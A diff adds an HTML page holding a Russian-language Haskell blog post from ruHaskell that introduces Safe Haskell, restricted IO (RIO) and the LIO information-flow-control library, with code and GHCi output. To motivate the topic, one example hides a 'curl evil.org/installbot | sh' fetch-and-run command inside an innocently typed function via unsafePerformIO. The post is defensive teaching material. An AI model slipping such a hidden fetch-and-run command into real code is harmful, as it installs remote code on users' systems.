@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="ru">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content>
+        <meta name="author" content>
+        <link rel="icon" href="../../../../../static/images/favicon.ico">
+
+        <title>Ограниченное IO  и защищенные системы (введение)</title>
+
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
+
+        <link href="../../../../../static/css/default.css" rel="stylesheet">
+        
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
+
+        <script>
+          window.___gcfg = {
+            lang: 'ru'
+          };
+        </script>
+
+        <script src="https://apis.google.com/js/platform.js" async defer>
+        </script>
+    
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="http://ruhaskell.org/feed.xml" />
+        
+        <script async defer id="github-bjs" src="https://buttons.github.io/buttons.js"></script>
+    </head>
+
+  <body>
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-58217738-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+    <div class="container">
+        <nav class="navbar navbar-default navbar-fixed-top">
+          <div class="container">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+
+              <div id="ruhaskell-logo">
+                <a class="navbar-brand" href="../../../../../" title="Домой">
+                  <img alt="ruHaskell" src="../../../../../static/images/logo.png" width="60">
+                </a>
+              </div>
+            </div>
+            
+            <div id="navbar" class="collapse navbar-collapse">
+              <ul class="nav navbar-nav">
+                <li class="dropdown">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Публикации<span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu" role="menu">
+                    <li>
+                        <a href="../../../../../archive.html">
+                            <span class="archive-link">
+                                <span class="fa fa-pencil"></span>
+                            </span>Статьи
+                        </a>
+                    </li>
+                    <li>
+                        <a href="../../../../../tags.html">
+                            <span class="tags-link">
+                                <span class="fa fa-tags"></span>
+                            </span>Теги
+                        </a>
+                    </li>
+                    <li>
+                        <a href="../../../../../categories.html">
+                            <span class="categories-link">
+                                <span class="fa fa-star"></span>
+                            </span>Категории
+                        </a>
+                    </li>
+                    <li>
+                        <a href="../../../../../authors.html">
+                            <span class="authors-link">
+                                <span class="fa fa-users"></span>
+                            </span>Авторы
+                        </a>
+                    </li>
+                  </ul>
+                </li>
+
+                <li class="dropdown">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Общение<span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu" role="menu">
+                    <li>
+                        <a href="https://gitter.im/ruHaskell/forall" target="_blank">
+                            <span class="chat-link">
+                                <span class="fa fa-smile-o"></span>
+                            </span>Чат
+                        </a>
+                    </li>
+                    <li>
+                        <a href="http://forum.ruhaskell.org" target="_blank">
+                            <span class="group-link">
+                                <span class="fa fa-group"></span>
+                            </span>Форум
+                        </a>
+                    </li>
+                    <li>
+                        <a href="../../../../../maillist.html">
+                            <span class="group-link">
+                                <span class="fa fa-group"></span>
+                            </span>Список рассылки
+                        </a>
+                    </li>
+                  </ul>
+                </li>
+
+                <li><a href="../../../../../links.html">Ссылки</a></li>
+              </ul>
+
+              <ul class="nav navbar-nav navbar-right">
+                <li class="dropdown">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Присоединяйтесь!<span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu" role="menu">
+                    <li>
+                        <a href="https://github.com/ruHaskell/ruhaskell" target="_blank">
+                            <span id="github-link">
+                                <span class="fa fa-github-square"></span>
+                            </span>GitHub
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://plus.google.com/communities/117343381540538069054" target="_blank">
+                            <span id="google-plus-link">
+                                <span class="fa fa-google-plus-square"></span>
+                            </span>Google+
+                        </a>
+                    </li>
+                    <li>
+                        <a href="../../../../../feed.xml">
+                            <span id="rss-link">
+                                <span class="fa fa-rss-square"></span>
+                            </span>RSS
+                        </a>
+                    </li>
+                  </ul>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+
+        <div id="content">
+            <h1>Ограниченное IO  и защищенные системы (введение)</h1>
+
+<div class="row">
+    <div class="col-xs-8 col-sm-6 col-md-5 col-lg-4">
+        <div class="post-info">
+            <strong>let</strong> author&nbsp;&nbsp;&nbsp;= "<a href="../../../../../authors/%25D0%2592%25D0%25B5%25D1%2580%25D1%2588%25D0%25B8%25D0%25BB%25D0%25BE%25D0%25B2%2520%25D0%2590%25D0%25BB%25D0%25B5%25D0%25BA%25D1%2581%25D0%25B0%25D0%25BD%25D0%25B4%25D1%2580.html">Вершилов Александр</a>"<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= fromGregorian 2015 feb 15<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;category = "<a href="../../../../../categories/theory.html">Теория</a>"<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;tags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= [&quot;<a href="../../../../../tags/theory.html">theory</a>&quot;, &quot;<a href="../../../../../tags/packages.html">packages</a>&quot;, &quot;<a href="../../../../../tags/security.html">security</a>&quot;]
+        </div>
+    </div>
+
+    <div class="col-xs-1 col-sm-2 col-md-3 col-lg-4"></div>
+  
+    <div class="col-xs-3 col-sm-4 col-md-4 col-lg-4">
+        
+    </div>
+</div>
+
+<p>В данном посте пойдет речь про возможности для создания защищенных систем и введение во фреймворк, позволяющий писать программы такие программы. В дальнейшем, если будет интерес к данным вопросам, планируется углубление в данную тему.</p>
+<h2 id="формулировка-проблемы">Формулировка проблемы</h2>
+<p>Под защищенной системой предполагается система, состоящая из одного или более узлов, устойчивая к запуску недоверенного кода, который лишается возможности нарушить инварианты системы.</p>
+<p>Где это может применяться? Простым примером может служить веб-сайт, на котором нужно запускать плагины от третьих лиц. В этом случае желательно, чтобы плагины не могли нарушить работу системы, получить привелигерованный доступ или получить доступ к данным в приложении, которые не должны быть доступны плагину.</p>
+<p>Более сложным примером может служить система с повышенными требованиями к безопасности, где для каждого блока данных существует определенный набор правил. Правила регламентируют кто и какие операции с ними может совершать, и желательно, чтобы весь написанный код, автоматически гарантировал сохранность этих инвариантов. Это позволит при анализе кода необходимо проверять только сами правила, а не весь исходный код.</p>
+<h3 id="безопасность-за-счет-типов">Безопасность за счет типов</h3>
+<p>Рассмотрим простейшие примеры того, как можно добиться безопасности. Поскольку Haskell является безопасным языком и все возможные эффекты выражены в типах функций, то можно предположить, что функции без нежелательных эффектов являются безопасными.</p>
+<p>Будем рассматривать первый пример - сайт, на который мы ходим добавить сервис переводов. Пусть плагин предоставляет следующую функцию:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="hs-definition">toRussian</span> <span class="hs-keyglyph">::</span> <span class="hs-conid">ByteString</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">ByteString</span></code></pre>
+<p>Исходя из типов данному коду можно доверять, поскольку он не содержит эффектов, и в худшем случае текст страницы будет сломан. Какие с ним могут быть проблемы:</p>
+<ol style="list-style-type: decimal">
+<li><p>код может быть плохо написан и потреблять много ресурсов (выходит за рамки данной статьи.</p></li>
+<li><p>выполнение кода может не завершаться:</p>
+<pre><code> toJerkish :: ByteString -&gt; ByteString
+ toJerkish xs 
+   | 'a' &lt;- B.head xs = toRussian xs    -- KABOOM!
+   | otherwise        = saneStuff</code></pre>
+<p>естественно, это печальное поведение, но, опять же не приводит к нарушению гарантий безопасности и мы его не рассматриваем.</p></li>
+<li><p>Но возможен и такой случай:</p>
+<pre><code>  toJerkish :: ByteString -&gt; ByteString
+  toJerkish = unsafePerformIO $ do
+      system &quot;curl evil.org/installbot | sh&quot;
+      return &quot;ЙА пАиМел тИбЯ&quot;</code></pre>
+<p>Данный код, ествественно, приводит к проблемам в безопасности и его бы хотелось исключить.</p></li>
+</ol>
+<p>Для третьего случая есть решение - использование расширения Safe Haskell.</p>
+<h4 id="safe-haskell">Safe Haskell</h4>
+<p>Начиная с ghc версии 7.2 haskell предоставляет расширение <a href="https://ghc.haskell.org/trac/ghc/wiki/SafeHaskell">Safe Haskell</a>, включающееся опцией <code>-XSafe</code>. Это расширение не позволяет включать в код небезопасные модули, например <code>System.IO.Unsafe</code>, таким образом использование <code>unsafePerformIO</code> и других подобных функций будет невозможно.</p>
+<p>В дополнение расширение позволяет использовать безопасные импорты, т.е.</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="hs-keyword">import</span> <span class="hs-keyword">safe</span> <span class="hs-conid">Evil</span><span class="hs-varop">.</span><span class="hs-conid">Code</span></code></pre>
+<p>В этом случае подключаемый модуль будет проверен на безопасность (т.е. то, что он не использует небезопасные модули).</p>
+<p>Однако, возникает вопрос, как же можно использовать модуль, работающий с типом <code>ByteString</code>, если для его неализации используются небезопасные функции?</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="hs-definition">head</span> <span class="hs-keyglyph">::</span> <span class="hs-comment">{- Lazy -}</span> <span class="hs-conid">ByteString</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">Word8</span>
+<span class="hs-definition">head</span> <span class="hs-conid">Empty</span>       <span class="hs-keyglyph">=</span> <span class="hs-varid">errorEmptyList</span> <span class="hs-str">"head"</span>
+<span class="hs-definition">head</span> <span class="hs-layout">(</span><span class="hs-conid">Chunk</span> <span class="hs-varid">c</span> <span class="hs-keyword">_</span><span class="hs-layout">)</span> <span class="hs-keyglyph">=</span> <span class="hs-conid">S</span><span class="hs-varop">.</span><span class="hs-varid">unsafeHead</span> <span class="hs-varid">c</span>
+
+<span class="hs-definition">unsafeHead</span> <span class="hs-keyglyph">::</span> <span class="hs-comment">{- Strict -}</span> <span class="hs-conid">ByteString</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">Word8</span>
+<span class="hs-definition">unsafeHead</span> <span class="hs-layout">(</span><span class="hs-conid">PS</span> <span class="hs-varid">x</span> <span class="hs-varid">s</span> <span class="hs-varid">l</span><span class="hs-layout">)</span> <span class="hs-keyglyph">=</span> <span class="hs-varid">assert</span> <span class="hs-layout">(</span><span class="hs-varid">l</span> <span class="hs-varop">&gt;</span> <span class="hs-num">0</span><span class="hs-layout">)</span> <span class="hs-varop">$</span>
+    <span class="hs-varid">inlinePerformIO</span> <span class="hs-varop">$</span> <span class="hs-varid">withForeignPtr</span> <span class="hs-varid">x</span> <span class="hs-varop">$</span> <span class="hs-keyglyph">\</span><span class="hs-varid">p</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-varid">peekByteOff</span> <span class="hs-varid">p</span> <span class="hs-varid">s</span></code></pre>
+<p>Рассмотрим, как в <code>Haskell</code> решается эта проблема. Модули, помеченные как безопасные, могут использовать, в свою очередь, только безопасные модули. Существует два типа безопасных модулей:</p>
+<ul>
+<li>те, безопасность которых доказана компилятором <code>-XSafe</code>;</li>
+<li>помеченные автором, как безопасные (<code>-XTrustworthy</code>).</li>
+</ul>
+<p>Таким образом такие модули как <code>Data.ByteString</code> могут быть собраны с флагом <code>-XTrustworthy</code>. Обычно для решения таких вопросов все небезопасные функции помещают в отдельный модуль, например <code>Data.ByteString.Unsafe</code>. Таким образом доказывается, что функции экспортируемые <code>Data.ByteString</code>, не могут быть использованы небезопасным образом, даже в том случае, когда внутренние модули используют небезопасные функции.</p>
+<p>Естественно, существуют механизмы управления доверием автору модуля, при помощи которых можно указать, доверять ли флагу <code>-XTrustworthy</code>. Флаг <code>-trust Pkg</code>, <code>-distruct Pkg</code>, <code>-distrust-all-packages</code>.</p>
+<h3 id="использование-ограниченного-io">Использование ограниченного IO</h3>
+<p>Проблема с чистыми функциями может считаться отчасти решенной, но что если для работы функции действительно необходимы <code>IO</code> эффекты. Например, сервис переводит реальный язык и должен общаться с сервером словаря?</p>
+<p>Решение данной проблемы заключается в использовании ограниченного <code>IO</code> (<code>RIO</code>) небезопасный код реализует функцию ввода-вывода:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="hs-definition">googleTranslate</span> <span class="hs-keyglyph">::</span> <span class="hs-conid">Language</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">L</span><span class="hs-varop">.</span><span class="hs-conid">ByteString</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">RIO</span> <span class="hs-conid">L</span><span class="hs-varop">.</span><span class="hs-conid">ByteString</span></code></pre>
+<p>Но использует монаду <code>RIO</code>. Таким образом доверенный модуль реализует функции <code>RIO</code> для доступа к сети, проверяет параметры и отклоняет опасные операции.</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="hs-comment">{-# LANGUAGE Trustworthy #-}</span>
+<span class="hs-keyword">module</span> <span class="hs-conid">RIO</span> <span class="hs-layout">(</span><span class="hs-conid">RIO</span><span class="hs-conid">()</span><span class="hs-layout">,</span> <span class="hs-varid">runRIO</span><span class="hs-layout">,</span> <span class="hs-conid">RIO</span><span class="hs-varop">.</span><span class="hs-varid">readFile</span><span class="hs-layout">)</span> <span class="hs-keyword">where</span>
+
+<span class="hs-comment">-- Notice that symbol UnsafeRIO is not exported from this module!</span>
+<span class="hs-keyword">newtype</span> <span class="hs-conid">RIO</span> <span class="hs-varid">a</span> <span class="hs-keyglyph">=</span> <span class="hs-conid">UnsafeRIO</span> <span class="hs-layout">(</span><span class="hs-conid">IO</span> <span class="hs-varid">a</span><span class="hs-layout">)</span> <span class="hs-comment">-- constructor is not exported !</span>
+<span class="hs-definition">runRIO</span> <span class="hs-keyglyph">::</span> <span class="hs-conid">RIO</span> <span class="hs-varid">a</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">IO</span> <span class="hs-varid">a</span>
+<span class="hs-definition">runRIO</span> <span class="hs-layout">(</span><span class="hs-conid">UnsafeRIO</span> <span class="hs-varid">io</span><span class="hs-layout">)</span> <span class="hs-keyglyph">=</span> <span class="hs-varid">io</span>
+
+<span class="hs-keyword">instance</span> <span class="hs-conid">Monad</span> <span class="hs-conid">RIO</span> <span class="hs-keyword">where</span>
+    <span class="hs-varid">return</span> <span class="hs-keyglyph">=</span> <span class="hs-conid">UnsafeRIO</span> <span class="hs-varop">.</span> <span class="hs-varid">return</span>
+    <span class="hs-varid">m</span> <span class="hs-varop">&gt;&gt;=</span> <span class="hs-varid">k</span> <span class="hs-keyglyph">=</span> <span class="hs-conid">UnsafeRIO</span> <span class="hs-varop">$</span> <span class="hs-varid">runRIO</span> <span class="hs-varid">m</span> <span class="hs-varop">&gt;&gt;=</span> <span class="hs-varid">runRIO</span> <span class="hs-varop">.</span> <span class="hs-varid">k</span>
+
+<span class="hs-comment">-- Returns True iff access is allowed to file name</span>
+<span class="hs-definition">pathOK</span> <span class="hs-keyglyph">::</span> <span class="hs-conid">FilePath</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">IO</span> <span class="hs-conid">Bool</span>
+<span class="hs-definition">pathOK</span> <span class="hs-varid">file</span> <span class="hs-keyglyph">=</span> <span class="hs-comment">{- Implement some policy based on file name -}</span>
+
+<span class="hs-definition">readFile</span> <span class="hs-keyglyph">::</span> <span class="hs-conid">FilePath</span> <span class="hs-keyglyph">-&gt;</span> <span class="hs-conid">RIO</span> <span class="hs-conid">String</span>
+<span class="hs-definition">readFile</span> <span class="hs-varid">file</span> <span class="hs-keyglyph">=</span> <span class="hs-conid">UnsafeRIO</span> <span class="hs-varop">$</span> <span class="hs-keyword">do</span>
+  <span class="hs-varid">ok</span> <span class="hs-keyglyph">&lt;-</span> <span class="hs-varid">pathOK</span> <span class="hs-varid">file</span>
+  <span class="hs-keyword">if</span> <span class="hs-varid">ok</span> <span class="hs-keyword">then</span> <span class="hs-conid">Prelude</span><span class="hs-varop">.</span><span class="hs-varid">readFile</span> <span class="hs-varid">file</span> <span class="hs-keyword">else</span> <span class="hs-varid">return</span> <span class="hs-str">""</span></code></pre>
+<p>Примеры политик для <code>RIO</code>:</p>
+<ul>
+<li>доступ к файловой системе предоставляется только в песочнице (защита файловой системы)</li>
+<li>запрет на запуск других программ (поскольку они могут не иметь ограничений <code>RIO</code>)</li>
+<li>разрешать коннекты только к 80 порту известных серверов (защита от рассылки спама и атак на внешние сервисы)</li>
+<li>запрет на доступ к устройствам (микрофону, камере, колонкам, …)</li>
+<li>политики схожие с политиками для Java в браузере</li>
+</ul>
+<p>Но, все же решение с <code>RIO</code> не достаточно, если мы вспомним все варианты использования, которые мы хотим решить.</p>
+<ul>
+<li>что если web-сайт содержит приватные данные, например письма?</li>
+<li>атакующий может сохранить письма в песочнице (разрешено)</li>
+<li>когда приходит запрос на перевод специальной строки - вернуть сохраненный email (разрешено)</li>
+</ul>
+<p>Таким образом, очевидно что для того, чтобы полноценно решить проблему безопасности, необходимо следить за тем, какая информация может быть опубликована, а какая нет. Так, например, разрешать отдавать в сеть публичные данные, и запрещать приватные. Для решения этой проблемы существует решение: Децентрализовнный Контроль За потоками информации (Decentralized Information Flow Control / DIFC)</p>
+<h3 id="тегированное-io">Тегированное IO</h3>
+<p>Команда из Стендфорда предлагает следующее решение - библиотеку LIO. Корни данного решения уходят в военные приложения и приложения работающие с секретными данными. И заключается оно в следующем:</p>
+<ul>
+<li>каждому блоку информации приписывается тег;</li>
+<li>каждому процессу/потоку приписывается тег;</li>
+<li>все теги имеют частичный порядок по отношению ⊑ (“может переходить к” / “can flow to”)</li>
+</ul>
+<p>Пример: расмотрим процесс vim с меткой <span class="math"><em>L</em><sub><em>v</em></sub></span>, и файл с меткой <span class="math"><em>L</em><sub><em>f</em></sub></span>; если файл читается то система требует, чтобы выполнялось соотношение <span class="math"><em>L</em><sub><em>f</em></sub> ⊑ <em>L</em><sub><em>v</em></sub></span> (файл может переходить к редактору); если файл записывается, то требуется, чтобы выполнялось соотношение <span class="math"><em>L</em><sub><em>v</em></sub> ⊑ <em>L</em><sub><em>f</em></sub></span>; если файл и пишется и читается, то <span class="math"><em>L</em><sub><em>v</em></sub> ⊑ <em>L</em><sub><em>f</em></sub> ⊑ <em>L</em><sub><em>v</em></sub></span>.</p>
+<p>Подобные соотношения являются тразитивными, что позволяет гораздо лучше оценивать безопасность. Предположим у нас есть файл <span class="math"><em>L</em><sub><em>f</em></sub></span>, при этом этот файл нельзя передавать по сети (например приватный ключ), т.е. есть соотношение <span class="math"><em>L</em><sub><em>f</em></sub>! ⊑ <em>L</em><sub><em>n</em></sub></span> . Теперь пусть процесс <span class="math"><em>P</em></span> читает данный файл, таким образом требуется <span class="math"><em>L</em><sub><em>f</em></sub> ⊑ <em>L</em><sub><em>P</em></sub></span>. Затем данный процесс хочет работать с сетью, что предполагает <span class="math"><em>L</em><sub><em>P</em></sub> ⊑ <em>L</em><sub><em>n</em></sub></span>, однако <span class="math"><em>L</em><sub><em>f</em></sub> ⊑ <em>L</em><sub><em>p</em></sub> ∧ <em>L</em><sub><em>p</em></sub> ⊑ <em>L</em><sub><em>n</em></sub> ⇒ <em>L</em><sub><em>f</em></sub> ⊑ <em>L</em><sub><em>n</em></sub></span> - противоречие, т.е. <span class="math"><em>L</em><sub><em>P</em></sub>! ⊑ <em>L</em><sub><em>N</em></sub></span>. Следовательно, процесс, получивший доступ к подобному файлу, не может общаться с сетью, и наоборот, если процесс общается с сетью, то он не может получить доступ к файлу.</p>
+<p>Представим двух пользвателей, <span class="math"><em>A</em></span> и <span class="math"><em>B</em></span>, публичную информацию обозначим тегом <span class="math"><em>L</em><sub>∅</sub></span>, приватные данные <span class="math"><em>A</em></span> - <span class="math"><em>L</em><sub><em>A</em></sub></span>, приватные данные <span class="math"><em>B</em></span> - <span class="math"><em>L</em><sub><em>B</em></sub></span> соответсвенно. Что произойдёт, если смешать приватные данные <span class="math"><em>A</em></span> и <span class="math"><em>B</em></span> в одном документе?. И <span class="math"><em>A</em></span> и <span class="math"><em>B</em></span> должны огорчатся если такой документ будет опубликован, соотвественно требуется, чтобы он был, как минимум, настолько же ограничен, насколько ограничены <span class="math"><em>L</em><sub><em>A</em></sub></span> и <span class="math"><em>L</em><sub><em>B</em></sub></span>. Для этого используется нижняя граница (или lub или join) <span class="math"><em>L</em><sub><em>A</em></sub></span> и <span class="math"><em>L</em><sub><em>B</em></sub></span>, которая записывается как <span class="math"><em>L</em><sub><em>A</em></sub> ⊔ <em>L</em><sub><em>B</em></sub></span>.</p>
+<pre><code>    A ⊔ B
+   /     \
+ ⊑/       \⊑ 
+ /         \
+A           B
+ \         /
+ ⊑\       /⊑ 
+   \     /
+      ∅        </code></pre>
+<p>Каждый процесс может обладать набором привилегий, используя привелению <span class="math"><em>p</em></span>, изменяет требование <span class="math"><em>L</em><sub><em>F</em></sub> ⊑ <sub><em>p</em></sub><em>L</em><sub><em>p</em><em>r</em><em>o</em><em>c</em></sub></span> на чтение и дополнительно <span class="math"><em>L</em><sub><em>p</em><em>r</em><em>o</em><em>c</em></sub> ⊑ <sub><em>p</em></sub><em>L</em><sub><em>F</em></sub></span> на запить файла. Операция <span class="math"> ⊑ <sub><em>p</em></sub></span> читается как “с учетом привигений р может переходить к” (``can flow under privileges p’’) и дозволяет больше, чем <span class="math"> ⊑ </span>. Идея этой операции заключется в том, что вы можете управлять уместными привилегиями. </p>
+<p>Пример привилегий: опять рассмотрим пример с двумя пользователями, Очевидно, что должны выполняться условия <span class="math"><em>A</em> ⊑ <sub><em>a</em></sub><em>L</em><sub>∅</sub></span> и <span class="math"><em>L</em><sub><em>B</em></sub> ⊑ <sub><em>b</em></sub><em>L</em><sub>∅</sub></span>, т.е. пользователи могут создавать публичную или рассекречивать собственную информацию. Пользователи могут частично рассекречивать информацию, т.е.: <span class="math"><em>L</em><sub><em>A</em><em>B</em></sub> ⊑ <sub><em>a</em></sub><em>L</em><sub><em>B</em></sub></span> и <span class="math"><em>L</em><sub><em>A</em><em>B</em></sub> ⊑ <sub><em>b</em></sub><em>L</em><sub><em>A</em></sub></span></p>
+<p>При работе с тегированными элементами обычно производится не проверка ограничений, а повышение текущего тега процесса так чтобы могли быть исполнены все действия. Так же можно задавать максимальный уровень доверия (clearance), выше которого доверие процесса не может быть повышено и действия приведут к исключению.</p>
+<h5 id="пример-возможных-правил">Пример возможных правил</h5>
+<p>Введем решетку:</p>
+<pre><code>             1
+           /    \
+          /      \
+... ->   B_i^j -> B_j^k -> ...
+       /     \   /
+      A_i     A_j  ...
+       \      /
+        \    /
+           0</code></pre>
+<p>С типами <span class="math">0</span>, <span class="math"><em>A</em><sub><em>i</em></sub></span>, <span class="math"><em>B</em><sub><em>i</em></sub><sup><em>j</em></sup></span>, <span class="math">1</span> – где:</p>
+<ul>
+<li><span class="math">0</span> - тег для информации, к которой никто не получал доступ,</li>
+<li><span class="math"><em>A</em><sub><em>i</em></sub></span> - тег для информации, к которой получал доступ только один участник <span class="math"><em>i</em></span>,</li>
+<li><span class="math"><em>B</em><sub><em>i</em></sub><sup><em>j</em></sup></span> – тег для информации, доступной двум участникам (<span class="math"><em>i</em></span> и <span class="math"><em>j</em></span>),</li>
+<li><span class="math">1</span> -тег для информации, доступной неограниченному количеству участников.</li>
+</ul>
+<p>С помощью этой решетки мы можем ограничить процессу возможность получения данных от разных процессов:</p>
+<pre class="sourceCode haskell"><code class="sourceCode haskell"><span class="hs-definition">test</span> <span class="hs-varid">i</span> <span class="hs-varid">s</span> <span class="hs-keyglyph">=</span> <span class="hs-keyword">do</span>
+    <span class="hs-varid">a1</span> <span class="hs-keyglyph">&lt;-</span> <span class="hs-varid">evalLIO</span> <span class="hs-layout">(</span><span class="hs-varid">newLIORef</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">1</span><span class="hs-layout">)</span> <span class="hs-str">"M1"</span><span class="hs-layout">)</span> <span class="hs-layout">(</span><span class="hs-conid">LIOState</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">1</span><span class="hs-layout">)</span> <span class="hs-conid">O</span><span class="hs-layout">)</span>
+    <span class="hs-varid">a2</span> <span class="hs-keyglyph">&lt;-</span> <span class="hs-varid">evalLIO</span> <span class="hs-layout">(</span><span class="hs-varid">newLIORef</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">2</span><span class="hs-layout">)</span> <span class="hs-str">"M2"</span><span class="hs-layout">)</span> <span class="hs-layout">(</span><span class="hs-conid">LIOState</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">2</span><span class="hs-layout">)</span> <span class="hs-conid">O</span><span class="hs-layout">)</span>
+    <span class="hs-varid">a3</span> <span class="hs-keyglyph">&lt;-</span> <span class="hs-varid">evalLIO</span> <span class="hs-layout">(</span><span class="hs-varid">newLIORef</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">3</span><span class="hs-layout">)</span> <span class="hs-str">"M3"</span><span class="hs-layout">)</span> <span class="hs-layout">(</span><span class="hs-conid">LIOState</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">3</span><span class="hs-layout">)</span> <span class="hs-conid">O</span><span class="hs-layout">)</span>
+    <span class="hs-keyword">let</span> <span class="hs-varid">state</span> <span class="hs-keyglyph">=</span> <span class="hs-keyglyph">[</span><span class="hs-layout">(</span><span class="hs-str">"A"</span><span class="hs-layout">,</span><span class="hs-varid">a1</span><span class="hs-layout">)</span><span class="hs-layout">,</span><span class="hs-layout">(</span><span class="hs-str">"B"</span><span class="hs-layout">,</span><span class="hs-varid">a2</span><span class="hs-layout">)</span><span class="hs-layout">,</span><span class="hs-layout">(</span><span class="hs-str">"C"</span><span class="hs-layout">,</span><span class="hs-varid">a3</span><span class="hs-layout">)</span><span class="hs-keyglyph">]</span>
+    <span class="hs-varid">runLIO</span> <span class="hs-layout">(</span><span class="hs-varid">go</span> <span class="hs-layout">(</span><span class="hs-varid">i</span><span class="hs-keyglyph">::</span><span class="hs-conid">Int</span><span class="hs-layout">)</span> <span class="hs-varid">state</span><span class="hs-layout">)</span> <span class="hs-layout">(</span><span class="hs-conid">LIOState</span> <span class="hs-layout">(</span><span class="hs-conid">A</span> <span class="hs-num">1</span><span class="hs-layout">)</span> <span class="hs-varid">s</span><span class="hs-layout">)</span>
+  <span class="hs-keyword">where</span> 
+    <span class="hs-varid">go</span> <span class="hs-num">0</span> <span class="hs-varid">x</span> <span class="hs-keyglyph">=</span> <span class="hs-varid">mailboxRead</span> <span class="hs-varid">x</span> <span class="hs-str">"A"</span>
+    <span class="hs-varid">go</span> <span class="hs-num">1</span> <span class="hs-varid">x</span> <span class="hs-keyglyph">=</span> <span class="hs-varid">mailboxRead</span> <span class="hs-varid">x</span> <span class="hs-str">"B"</span> <span class="hs-varop">&gt;&gt;</span> <span class="hs-varid">go</span> <span class="hs-num">0</span> <span class="hs-varid">x</span>
+    <span class="hs-varid">go</span> <span class="hs-num">2</span> <span class="hs-varid">x</span> <span class="hs-keyglyph">=</span> <span class="hs-varid">mailboxRead</span> <span class="hs-varid">x</span> <span class="hs-str">"C"</span> <span class="hs-varop">&gt;&gt;</span> <span class="hs-varid">go</span> <span class="hs-num">1</span> <span class="hs-varid">x</span></code></pre>
+<pre><code> -- запускаем тест, без ограничения (максимальный уровень доверия)
+ *Main> test 0 O
+ (Just "M1",LIOState {lioLabel = A 1, lioClearance = O})\
+ -- программа получала доступ только к своей ячейке - метка не изменяется
+ *Main> test 1 O
+ (Just "M1",LIOState {lioLabel = B 1 2, lioClearance = O})
+ -- программа получала доступ к двум ячейкам - соотвественно метка изменилась
+ *Main> test 2 O
+ (Just "M1",LIOState {lioLabel = O, lioClearance = O})
+ -- программа получала доступ к трем ячейчас - соотвественно метка стала 1 (One)
+
+ -- Теперь запустим тесты с огрниченным уровнем доверия
+ *Main> test 2 O
+ (Just "M1",LIOState {lioLabel = O, lioClearance = O})
+ *Main> test 0 (B 1 2)
+ (Just "M1",LIOState {lioLabel = A 1, lioClearance = B 1 2})
+ *Main> test 1 (B 1 2)
+ (Just "M1",LIOState {lioLabel = B 1 2, lioClearance = B 1 2})
+ *Main> test 2 (B 1 2)
+ (*** Exception: LabelError {lerrContext = ["readLIORef"], lerrFailure = "taint", lerrCurLabel = A 1, lerrCurClearance = B 1 2, lerrPrivs = [], lerrLabels = [A 3]}
+ -- получили исключение в связи с попыткой превышения прав.
+ *Main> test 1 (B 1 3)
+ (*** Exception: LabelError {lerrContext = ["readLIORef"], lerrFailure = "taint", lerrCurLabel = A 1, lerrCurClearance = B 1 3, lerrPrivs = [], lerrLabels = [A 2]}</code></pre>
+<p>В дальнейших постах могут быть рассмотрены и более сложные возможности применения библиотеки, такие как:</p>
+<pre><code>* использование привилегий;
+* более сложные правила для тегов, использующиеся для описания сложных систем;
+* полный пример небольшого защищенного сервиса.</code></pre>
